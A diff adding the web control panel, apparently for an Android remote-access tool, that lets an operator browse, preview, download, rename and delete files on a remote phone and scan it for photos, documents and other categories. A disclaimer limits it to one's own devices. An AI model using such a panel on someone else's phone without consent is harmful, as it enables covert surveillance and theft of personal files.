@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>File Manager - Remote Access</title>
+    <link rel="stylesheet" href="/css/hacker-theme.css">
+    <link href="https://api.fontshare.com/v2/css?f[]=satoshi@400,500,700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
+    <style>
+        :root {
+            --font-display: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            --font-mono: 'Satoshi', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+
+        body {
+            padding: 0;
+            min-height: 100vh;
+            font-family: var(--font-display) !important;
+        }
+
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px 24px;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        /* ── HEADER ── */
+        .pg-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 22px;
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin-bottom: 16px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .pg-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent 10%, var(--accent) 50%, transparent 90%);
+            opacity: 0.4;
+        }
+
+        .pg-header-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .pg-icon {
+            width: 42px;
+            height: 42px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.12), rgba(0, 255, 65, 0.04));
+            border: 1px solid rgba(0, 255, 65, 0.25);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent);
+            box-shadow: 0 0 16px rgba(0, 255, 65, 0.08);
+        }
+
+        .pg-title {
+            font-family: var(--font-display);
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #e8e8e8;
+        }
+
+        .pg-title span {
+            color: var(--accent);
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
+        }
+
+        .pg-sub {
+            font-family: var(--font-mono);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 1px;
+            margin-top: 1px;
+        }
+
+        .count-badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-family: var(--font-display);
+            font-size: 0.55rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        .btn-back {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 500;
+            text-decoration: none;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+
+        .btn-back:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        /* ── TOOLBAR ── */
+        .toolbar {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .tb-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 7px 14px;
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .tb-btn:hover {
+            color: var(--accent);
+            border-color: rgba(0, 255, 65, 0.25);
+            background: rgba(0, 255, 65, 0.04);
+        }
+
+        .tb-btn.primary {
+            background: rgba(0, 255, 65, 0.08);
+            border-color: rgba(0, 255, 65, 0.2);
+            color: var(--accent);
+        }
+
+        .tb-btn.primary:hover {
+            background: rgba(0, 255, 65, 0.14);
+        }
+
+        .tb-btn.muted {
+            opacity: 0.5;
+            cursor: default;
+        }
+
+        .tb-sep {
+            width: 1px;
+            height: 20px;
+            background: var(--border);
+            margin: 0 4px;
+        }
+
+        /* ── BREADCRUMB ── */
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0;
+            padding: 10px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            font-family: var(--font-mono);
+            font-size: 0.7rem;
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+
+        .bc-link {
+            color: var(--accent);
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.15s;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+
+        .bc-link:hover {
+            background: rgba(0, 255, 65, 0.08);
+            text-decoration: none;
+        }
+
+        .bc-sep {
+            color: var(--text-muted);
+            margin: 0 2px;
+            opacity: 0.5;
+        }
+
+        .bc-current {
+            color: var(--text-primary);
+            padding: 2px 4px;
+        }
+
+        /* ── FILE LIST ── */
+        .file-list {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .file-item {
+            display: grid;
+            grid-template-columns: 36px 1fr auto auto;
+            gap: 10px;
+            align-items: center;
+            padding: 10px 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.025);
+            transition: background 0.15s;
+            cursor: default;
+            font-size: 0.8rem;
+        }
+
+        .file-item:last-child {
+            border-bottom: none;
+        }
+
+        .file-item:hover {
+            background: rgba(0, 255, 65, 0.02);
+        }
+
+        .file-item .f-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.025);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            color: var(--text-secondary);
+            flex-shrink: 0;
+        }
+
+        .file-item .f-icon.folder {
+            background: rgba(0, 255, 65, 0.06);
+            border-color: rgba(0, 255, 65, 0.12);
+            color: var(--accent);
+        }
+
+        .file-item .f-icon.parent {
+            background: rgba(0, 170, 255, 0.06);
+            border-color: rgba(0, 170, 255, 0.12);
+            color: var(--info);
+        }
+
+        .file-item .f-name {
+            font-family: var(--font-display);
+            font-weight: 500;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .file-item .f-name.link {
+            color: var(--accent);
+            cursor: pointer;
+        }
+
+        .file-item .f-name.link:hover {
+            text-decoration: underline;
+        }
+
+        .file-item .f-size {
+            font-family: var(--font-mono);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            white-space: nowrap;
+            text-align: right;
+        }
+
+        .file-item .f-acts {
+            display: flex;
+            gap: 4px;
+        }
+
+        .f-act-btn {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.025);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 6px;
+            cursor: pointer;
+            color: var(--text-secondary);
+            transition: all 0.15s;
+        }
+
+        .f-act-btn:hover {
+            background: rgba(0, 255, 65, 0.08);
+            border-color: rgba(0, 255, 65, 0.2);
+            color: var(--accent);
+        }
+
+        .f-act-btn.danger:hover {
+            background: rgba(255, 51, 51, 0.1);
+            border-color: rgba(255, 51, 51, 0.25);
+            color: var(--danger);
+        }
+
+        /* ── EMPTY / MSG STATES ── */
+        .empty {
+            text-align: center;
+            padding: 60px 24px;
+            color: var(--text-muted);
+        }
+
+        .empty .e-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            opacity: 0.3;
+        }
+
+        .empty h2 {
+            font-family: var(--font-display);
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+
+        .empty p {
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+        }
+
+        .pulse-load {
+            animation: pLoad 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pLoad {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255,255,255,0.06);
+            border-top: 3px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ── DISCLAIMER ── */
+        .disc {
+            margin-top: 28px;
+            padding: 16px 20px;
+            background: rgba(255, 170, 0, 0.03);
+            border: 1px solid rgba(255, 170, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .disc h4 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-display);
+            font-size: 0.7rem;
+            font-weight: 600;
+            color: var(--warning);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .disc p {
+            font-family: var(--font-display);
+            font-size: 0.65rem;
+            color: var(--text-muted);
+            line-height: 1.6;
+        }
+
+        /* ── FOOTER ── */
+        .ft {
+            text-align: center;
+            padding: 32px 16px;
+            margin-top: 28px;
+            border-top: 1px solid var(--border);
+        }
+
+        .ft .ft-label {
+            font-family: var(--font-display);
+            font-size: 0.6rem;
+            color: var(--text-muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        .ft .ft-brand {
+            display: inline-block;
+            font-family: var(--font-display);
+            font-size: 1.3rem;
+            font-weight: 700;
+            letter-spacing: 3px;
+            text-transform: lowercase;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--accent), #00e5ff, var(--accent));
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 0 8px rgba(0, 255, 65, 0.2));
+            transition: all 0.4s ease;
+        }
+
+        .ft .ft-brand:hover {
+            filter: drop-shadow(0 0 16px rgba(0, 255, 65, 0.4));
+            animation: brandShine 1.5s ease infinite;
+        }
+
+        @keyframes brandShine {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .ft .ft-copy {
+            font-family: var(--font-mono);
+            font-size: 0.55rem;
+            color: var(--text-muted);
+            margin-top: 8px;
+            letter-spacing: 1px;
+        }
+
+        /* ── CATEGORIES ── */
+        .categories {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .cat-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            padding: 9px 16px;
+            font-family: var(--font-display);
+            font-size: 0.68rem;
+            font-weight: 600;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            color: var(--text-secondary);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cat-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            transition: opacity 0.25s;
+            border-radius: 20px;
+        }
+
+        .cat-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+        }
+
+        .cat-btn .cat-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        /* Photos */
+        .cat-btn.photos { border-color: rgba(255, 107, 107, 0.2); }
+        .cat-btn.photos .cat-icon { background: rgba(255, 107, 107, 0.12); color: #ff6b6b; }
+        .cat-btn.photos:hover { background: rgba(255, 107, 107, 0.06); border-color: rgba(255, 107, 107, 0.35); color: #ff6b6b; }
+
+        /* Downloads */
+        .cat-btn.downloads { border-color: rgba(0, 200, 255, 0.2); }
+        .cat-btn.downloads .cat-icon { background: rgba(0, 200, 255, 0.12); color: #00c8ff; }
+        .cat-btn.downloads:hover { background: rgba(0, 200, 255, 0.06); border-color: rgba(0, 200, 255, 0.35); color: #00c8ff; }
+
+        /* Documents */
+        .cat-btn.documents { border-color: rgba(255, 200, 50, 0.2); }
+        .cat-btn.documents .cat-icon { background: rgba(255, 200, 50, 0.12); color: #ffc832; }
+        .cat-btn.documents:hover { background: rgba(255, 200, 50, 0.06); border-color: rgba(255, 200, 50, 0.35); color: #ffc832; }
+
+        /* Videos */
+        .cat-btn.videos { border-color: rgba(180, 100, 255, 0.2); }
+        .cat-btn.videos .cat-icon { background: rgba(180, 100, 255, 0.12); color: #b464ff; }
+        .cat-btn.videos:hover { background: rgba(180, 100, 255, 0.06); border-color: rgba(180, 100, 255, 0.35); color: #b464ff; }
+
+        /* Music */
+        .cat-btn.music { border-color: rgba(0, 255, 130, 0.2); }
+        .cat-btn.music .cat-icon { background: rgba(0, 255, 130, 0.12); color: #00ff82; }
+        .cat-btn.music:hover { background: rgba(0, 255, 130, 0.06); border-color: rgba(0, 255, 130, 0.35); color: #00ff82; }
+
+        /* APKs */
+        .cat-btn.apks { border-color: rgba(255, 130, 0, 0.2); }
+        .cat-btn.apks .cat-icon { background: rgba(255, 130, 0, 0.12); color: #ff8200; }
+        .cat-btn.apks:hover { background: rgba(255, 130, 0, 0.06); border-color: rgba(255, 130, 0, 0.35); color: #ff8200; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .wrap {
+                padding: 10px;
+            }
+
+            .pg-header {
+                padding: 12px 16px;
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+
+            .pg-icon {
+                width: 36px;
+                height: 36px;
+            }
+
+            .pg-title {
+                font-size: 0.9rem;
+            }
+
+            .toolbar {
+                gap: 6px;
+            }
+
+            .tb-btn {
+                padding: 6px 10px;
+                font-size: 0.58rem;
+            }
+
+            .file-item {
+                grid-template-columns: 32px 1fr auto;
+                gap: 8px;
+                padding: 8px 12px;
+            }
+
+            .file-item .f-size {
+                display: none;
+            }
+
+            .f-act-btn {
+                width: 26px;
+                height: 26px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .pg-sub {
+                display: none;
+            }
+
+            .btn-back .lbl {
+                display: none;
+            }
+
+            .tb-sep {
+                display: none;
+            }
+
+            .categories {
+                gap: 6px;
+            }
+
+            .cat-btn {
+                padding: 7px 12px;
+                font-size: 0.6rem;
+            }
+
+            .cat-btn .cat-icon {
+                width: 24px;
+                height: 24px;
+                border-radius: 6px;
+            }
+
+            .file-item .f-icon {
+                width: 30px;
+                height: 30px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap">
+
+        <!-- HEADER -->
+        <div class="pg-header">
+            <div class="pg-header-left">
+                <div class="pg-icon">
+                    <i data-lucide="folder" style="width:20px;height:20px;"></i>
+                </div>
+                <div>
+                    <div class="pg-title">
+                        <span>File</span> Manager
+                        <span class="count-badge" id="file-count" style="display:none">0</span>
+                    </div>
+                    <div class="pg-sub">// remote file system</div>
+                </div>
+            </div>
+            <a href="javascript:window.history.back()" class="btn-back">
+                <i data-lucide="arrow-left" style="width:14px;height:14px;"></i>
+                <span class="lbl">Back</span>
+            </a>
+        </div>
+
+        <!-- TOOLBAR -->
+        <div class="toolbar">
+            <button class="tb-btn primary" id="btn-upload" style="display:none">
+                <i data-lucide="upload" style="width:13px;height:13px;"></i> Upload
+            </button>
+            <button class="tb-btn primary" id="btn-newfolder" style="display:none">
+                <i data-lucide="folder-plus" style="width:13px;height:13px;"></i> New Folder
+            </button>
+            <span class="tb-sep"></span>
+            <button class="tb-btn" id="btn-home">
+                <i data-lucide="hard-drive" style="width:13px;height:13px;"></i> Internal
+            </button>
+            <span id="external-storage-btns"></span>
+            <button class="tb-btn" id="btn-trash">
+                <i data-lucide="trash-2" style="width:13px;height:13px;"></i> Recycle Bin
+            </button>
+            <span class="tb-sep"></span>
+            <button class="tb-btn" id="btn-refresh">
+                <i data-lucide="refresh-cw" style="width:13px;height:13px;"></i> Refresh
+            </button>
+        </div>
+
+        <!-- CATEGORIES -->
+        <div class="categories">
+            <button class="cat-btn photos" id="btn-photos">
+                <div class="cat-icon"><i data-lucide="image" style="width:14px;height:14px;"></i></div>
+                Photos
+            </button>
+            <button class="cat-btn downloads" id="btn-downloads">
+                <div class="cat-icon"><i data-lucide="download" style="width:14px;height:14px;"></i></div>
+                Downloads
+            </button>
+            <button class="cat-btn documents" id="btn-documents">
+                <div class="cat-icon"><i data-lucide="file-text" style="width:14px;height:14px;"></i></div>
+                Documents
+            </button>
+            <button class="cat-btn videos" id="btn-videos">
+                <div class="cat-icon"><i data-lucide="film" style="width:14px;height:14px;"></i></div>
+                Videos
+            </button>
+            <button class="cat-btn music" id="btn-music">
+                <div class="cat-icon"><i data-lucide="music" style="width:14px;height:14px;"></i></div>
+                Music
+            </button>
+            <button class="cat-btn apks" id="btn-apks">
+                <div class="cat-icon"><i data-lucide="smartphone" style="width:14px;height:14px;"></i></div>
+                Installation
+            </button>
+        </div>
+
+        <!-- BREADCRUMB -->
+        <div class="breadcrumb" id="breadcrumb"></div>
+
+        <!-- FILE LIST -->
+        <div class="file-list" id="file-list">
+            <div class="empty">
+                <div class="spinner"></div>
+                <h2>Scanning Files</h2>
+                <p>Loading file system...</p>
+            </div>
+        </div>
+
+        <!-- DISCLAIMER -->
+        <div class="disc">
+            <h4>
+                <i data-lucide="alert-triangle" style="width:13px;height:13px;"></i>
+                Disclaimer
+            </h4>
+            <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely
+                manage their own devices. Installing or using this on a device without the owner's explicit
+                consent is illegal and unethical.</p>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="ft">
+        <div class="ft-label">crafted by</div>
+        <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="ft-brand">thiyo-de</a>
+        <div class="ft-copy">&copy; 2025 &middot; all rights reserved</div>
+    </footer>
+
+    <script src="/js/api.js"></script>
+    <script src="/js/call-notification.js"></script>
+    <script>
+        lucide.createIcons();
+
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let currentPath = '/storage/emulated/0';
+
+        if (!deviceId) window.location.href = 'index.html';
+
+
+        // Lucide icon name by file extension
+        function getFileIcon(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            const map = {
+                'pdf': 'file-text', 'doc': 'file-text', 'docx': 'file-text', 'txt': 'file-text', 'rtf': 'file-text',
+                'jpg': 'image', 'jpeg': 'image', 'png': 'image', 'gif': 'image', 'bmp': 'image', 'svg': 'image', 'webp': 'image',
+                'mp4': 'film', 'avi': 'film', 'mkv': 'film', 'mov': 'film', 'wmv': 'film', 'flv': 'film', 'webm': 'film',
+                'mp3': 'music', 'wav': 'music', 'flac': 'music', 'aac': 'music', 'ogg': 'music', 'm4a': 'music',
+                'zip': 'archive', 'rar': 'archive', '7z': 'archive', 'tar': 'archive', 'gz': 'archive',
+                'js': 'file-code', 'html': 'file-code', 'css': 'file-code', 'json': 'file-code', 'xml': 'file-code',
+                'java': 'file-code', 'py': 'file-code', 'kt': 'file-code',
+                'apk': 'smartphone'
+            };
+            return map[ext] || 'file';
+        }
+
+        // Breadcrumb
+        function renderBreadcrumb(path) {
+            const el = document.getElementById('breadcrumb');
+            const parts = path.split('/').filter(p => p);
+
+            let html = '<span class="bc-link" onclick="loadFiles(\'/\')">HOME</span>';
+            let cur = '';
+
+            parts.forEach((part, i) => {
+                cur += '/' + part;
+                html += '<span class="bc-sep">/</span>';
+                if (i === parts.length - 1) {
+                    html += `<span class="bc-current">${escHtml(part)}</span>`;
+                } else {
+                    html += `<span class="bc-link" onclick="loadFiles('${escJs(cur)}')">${escHtml(part)}</span>`;
+                }
+            });
+
+            el.innerHTML = html;
+        }
+
+        function updateToolbarVisibility() {
+            const inStorage = currentPath.startsWith('/storage/emulated/0');
+            document.getElementById('btn-upload').style.display = inStorage ? '' : 'none';
+            document.getElementById('btn-newfolder').style.display = inStorage ? '' : 'none';
+        }
+
+        async function loadFiles(path = currentPath) {
+            // FIX-F5: Show loading state immediately so user knows navigation is in progress
+            const container = document.getElementById('file-list');
+            container.innerHTML = `<div class="empty"><div class="spinner"></div><h2>Loading...</h2><p>${escHtml(path)}</p></div>`;
+            lucide.createIcons();
+            try {
+                const response = await api.sendCommand(deviceId, 'files_list', { path });
+
+                if (response.success && response.data) {
+                    currentPath = response.data.path || path;
+                    renderBreadcrumb(currentPath);
+                    renderFiles(response.data.files || []);
+                    updateToolbarVisibility();
+                } else {
+                    throw new Error(response.error || 'Failed to load files');
+                }
+            } catch (error) {
+                console.error(error);
+                api.showToast('Failed to load files: ' + error.message, 'error');
+            }
+        }
+
+        function renderFiles(files) {
+            const container = document.getElementById('file-list');
+            const countEl = document.getElementById('file-count');
+            let html = '';
+            const isCategoryView = currentPath.startsWith('/CATEGORY');
+
+            countEl.style.display = 'inline-block';
+            countEl.textContent = files.length + ' items';
+
+            // Parent directory
+            if (!isCategoryView && currentPath !== '/storage/emulated/0' && currentPath !== '/storage/emulated/0/') {
+                const parentPath = currentPath.substring(0, currentPath.lastIndexOf('/'));
+                html += `
+                    <div class="file-item" onclick="loadFiles('${escJs(parentPath)}')" style="cursor:pointer">
+                        <div class="f-icon parent"><i data-lucide="corner-left-up" style="width:16px;height:16px;"></i></div>
+                        <div class="f-name link">.. (Parent Directory)</div>
+                        <div class="f-size"></div>
+                        <div class="f-acts"></div>
+                    </div>`;
+            }
+
+            // Android 11+ Scoped Storage Warning
+            if (currentPath.includes('/Android/data') || currentPath.includes('/Android/obb')) {
+                html += `
+                    <div class="disc" style="margin-top: 0; margin-bottom: 14px; padding: 12px 16px;">
+                        <h4 style="margin-bottom: 4px;"><i data-lucide="eye-off" style="width:13px;height:13px;"></i> Android 11+ Hidden Folders</h4>
+                        <p style="font-size: 0.6rem;">Due to Android Scoped Storage policies, the OS forcibly hides the contents of <code>/Android/data</code> and <code>/Android/obb</code> from all apps. These folders may appear empty here even if they contain files on the device.</p>
+                    </div>`;
+            }
+
+
+            if (files.length === 0) {
+                countEl.textContent = 'empty';
+                if (!html) html = `
+                    <div class="empty">
+                        <div class="e-icon"><i data-lucide="folder-open" style="width:48px;height:48px;"></i></div>
+                        <h2>Empty Folder</h2>
+                        <p>No files or subdirectories found.</p>
+                    </div>`;
+            } else {
+                html += files.map(file => {
+                    const isFolder = file.type === 'folder' || file.type === 'directory';
+                    const iconName = isFolder ? 'folder' : getFileIcon(file.name);
+                    const absolutePath = file.path || `${currentPath}/${file.name}`;
+                    const nameClass = isFolder ? 'f-name link' : 'f-name';
+                    const nameClick = isFolder ? `onclick="loadFiles('${escJs(absolutePath)}')"` : '';
+                    
+                    const ext = file.name.split('.').pop().toLowerCase();
+                    const isImage = ['jpg','jpeg','png','gif','bmp','webp','svg'].includes(ext);
+                    const isVideo = ['mp4','avi','mkv','mov','wmv','webm','3gp'].includes(ext);
+                    const isAudio = ['mp3','wav','flac','aac','ogg','m4a'].includes(ext);
+                    const hasPreview = !isFolder && (isImage || isVideo || isAudio);
+                    const previewBtn = hasPreview ? `<button class="f-act-btn" title="Preview" onclick="previewFile('${escJs(absolutePath)}','${escJs(file.name)}')"><i data-lucide="eye" style="width:13px;height:13px;"></i></button>` : '';
+
+                    return `
+                        <div class="file-item" data-path="${escHtml(absolutePath)}" data-type="${file.type}">
+                            <div class="f-icon ${isFolder ? 'folder' : ''}"><i data-lucide="${iconName}" style="width:16px;height:16px;"></i></div>
+                            <div class="${nameClass}" ${nameClick}>${escHtml(file.name)}</div>
+                            <div class="f-size">${file.type === 'file' ? api.formatFileSize(file.size) : ''}</div>
+                            <div class="f-acts">
+                                ${previewBtn}
+                                <button class="f-act-btn" title="Download" onclick="downloadFile('${escJs(absolutePath)}')"><i data-lucide="download" style="width:13px;height:13px;"></i></button>
+                                <button class="f-act-btn" title="Rename" onclick="renameFile('${escJs(absolutePath)}')"><i data-lucide="pencil" style="width:13px;height:13px;"></i></button>
+                                <button class="f-act-btn danger" title="Delete" onclick="deleteFile('${escJs(absolutePath)}')"><i data-lucide="trash-2" style="width:13px;height:13px;"></i></button>
+                            </div>
+                        </div>`;
+                }).join('');
+            }
+
+            container.innerHTML = html;
+            lucide.createIcons();
+        }
+
+        // ===== EXTERNAL STORAGE =====
+        async function detectExternalStorage() {
+            const container = document.getElementById('external-storage-btns');
+            const volumes = [];
+
+            try {
+                const storageRes = await api.sendCommand(deviceId, 'storage_info', {});
+                if (storageRes.success && storageRes.data && storageRes.data.volumes) {
+                    for (const v of storageRes.data.volumes) {
+                        let iconName = 'hard-drive';
+                        let label = v.name;
+                        if (v.type === 'usb') { iconName = 'usb'; label = 'USB: ' + v.name; }
+                        else if (v.type === 'sdcard') { iconName = 'disc'; label = 'SD Card'; }
+                        else { label = v.name.length > 10 ? 'EXT: ' + v.name.substring(0, 8) + '..' : v.name; }
+                        volumes.push({ path: v.path, label, iconName });
+                    }
+                }
+            } catch (e) {
+                console.log('storage_info not available, falling back to /storage scan');
+            }
+
+            if (volumes.length === 0) {
+                try {
+                    const response = await api.sendCommand(deviceId, 'files_list', { path: '/storage' });
+                    if (response.success && response.data) {
+                        (response.data.files || []).forEach(f => {
+                            if ((f.type === 'folder' || f.type === 'directory') &&
+                                f.name !== 'emulated' && f.name !== 'self') {
+                                let label = f.name;
+                                let iconName = 'hard-drive';
+                                const lower = f.name.toLowerCase();
+                                if (lower.includes('usb') || lower.includes('otg')) { iconName = 'usb'; label = 'USB: ' + f.name; }
+                                else if (lower.match(/^[a-f0-9]{4}-[a-f0-9]{4}$/i)) { iconName = 'disc'; label = 'SD Card'; }
+                                else { label = f.name.length > 10 ? 'EXT: ' + f.name.substring(0, 8) + '..' : f.name; }
+                                volumes.push({ path: '/storage/' + f.name, label, iconName });
+                            }
+                        });
+                    }
+                } catch (e) { }
+
+                // FIX-F1: Was using raw fetch() without CSRF token header — rejected with 403 on CSP deployments
+            // Now uses api.sendCommand() which automatically includes the X-CSRF-Token header
+            try {
+                const mntResp = await api.sendCommand(deviceId, 'files_list', { path: '/mnt/media_rw' });
+                if (mntResp.success && mntResp.data) {
+                    (mntResp.data.files || []).forEach(f => {
+                        if (f.type === 'folder' || f.type === 'directory') {
+                            if (!volumes.some(v => v.path.endsWith('/' + f.name))) {
+                                volumes.push({ path: '/mnt/media_rw/' + f.name, label: 'MNT: ' + f.name, iconName: 'usb' });
+                            }
+                        }
+                    });
+                }
+            } catch (e) { }
+            }
+
+            if (volumes.length === 0) {
+                container.innerHTML = `<button class="tb-btn muted" onclick="showNoExtStorage()"><i data-lucide="hard-drive-download" style="width:13px;height:13px;"></i> No Ext Storage</button>`;
+            } else {
+                container.innerHTML = volumes.map(v =>
+                    `<button class="tb-btn" onclick="loadFiles('${escJs(v.path)}')" title="${escHtml(v.path)}"><i data-lucide="${v.iconName}" style="width:13px;height:13px;"></i> ${escHtml(v.label)}</button>`
+                ).join('');
+            }
+            lucide.createIcons();
+        }
+
+        function showNoExtStorage() {
+            const container = document.getElementById('file-list');
+            document.getElementById('file-count').style.display = 'none';
+            document.getElementById('breadcrumb').innerHTML = '';
+            currentPath = '';
+            updateToolbarVisibility(); // hides upload + newfolder consistently
+            container.innerHTML = `
+                <div class="empty">
+                    <div class="e-icon"><i data-lucide="hard-drive-download" style="width:48px;height:48px;"></i></div>
+                    <h2>No External Storage Detected</h2>
+                    <p>No SD cards or USB/OTG devices are connected.</p>
+                </div>`;
+            lucide.createIcons();
+        }
+
+        // Init
+        loadFiles();
+        detectExternalStorage();
+
+        // Event Listeners — Refresh only reloads files, NOT external storage (avoids 3x WebSocket round-trips)
+        document.getElementById('btn-refresh').addEventListener('click', () => {
+            loadFiles(currentPath);
+        });
+
+        document.getElementById('btn-home').addEventListener('click', () => loadFiles('/storage/emulated/0'));
+
+        // Category dynamic-access buttons
+        const categoryTypes = {
+            'btn-photos': 'images',
+            'btn-downloads': 'downloads',
+            'btn-documents': 'documents',
+            'btn-videos': 'videos',
+            'btn-music': 'audio',
+            'btn-apks': 'installations'
+        };
+
+        Object.entries(categoryTypes).forEach(([btnId, type]) => {
+            document.getElementById(btnId).addEventListener('click', async () => {
+                const container = document.getElementById('file-list');
+                
+                // Show scanning UI purely for visual feedback on large phones
+                container.innerHTML = `
+                    <div class="empty">
+                        <div class="spinner"></div>
+                        <h2>Querying Device Storage</h2>
+                        <p>Scanning all internal and external storage for ${type}...</p>
+                    </div>`;
+                lucide.createIcons();
+                document.getElementById('file-count').style.display = 'none';
+
+                try {
+                    const response = await api.sendCommand(deviceId, 'files_category', { category: type });
+                    if (response.success && response.data && response.data.files) {
+                        currentPath = response.data.path || `/CATEGORY/${type.toUpperCase()}`;
+                        renderBreadcrumb(currentPath);
+                        renderFiles(response.data.files || []);
+                        updateToolbarVisibility();
+                    } else {
+                        // Complete Failure -> Show Empty Warning
+                        renderBreadcrumb(`/CATEGORY/${type.toUpperCase()}`);
+                        container.innerHTML = `
+                            <div class="empty">
+                                <div class="e-icon"><i data-lucide="folder-x" style="width:48px;height:48px;"></i></div>
+                                <h2>No ${type} Found</h2>
+                                <p>This device doesn't have any files matching this category.</p>
+                            </div>`;
+                        lucide.createIcons();
+                    }
+                } catch (error) {
+                    api.showToast('Failed to query category: ' + error.message, 'error');
+                }
+            });
+        });
+
+        document.getElementById('btn-trash').addEventListener('click', async () => {
+            const trashPaths = [
+                '/storage/emulated/0/.Trash',
+                '/storage/emulated/0/.trash',
